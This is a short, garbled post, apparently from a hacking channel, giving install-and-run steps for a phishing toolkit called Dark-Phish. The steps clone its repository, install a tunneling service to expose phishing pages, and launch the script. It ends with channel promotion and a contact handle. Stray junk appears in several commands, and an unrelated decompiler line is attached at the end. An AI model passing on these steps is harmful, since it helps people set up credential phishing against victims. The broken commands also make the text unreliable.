...
100% working
1) apt install python3 curl php git openssh-y 
2) pip3 install requests wget pyshorteners
3) git clone sdfg
https://github.com/Cyber-Anonymous/Dark-Phish.git
cd Dark-Phish
4) chmod +x dark-phish.py
5) apt install localxpose
6) python3 dark-phish.py b nm

Subscribe And Like ❤
Thanks for joining My channel 🔰
Any Inquiry To Dm :- @teambothacker# Source Generated with Decompyle++
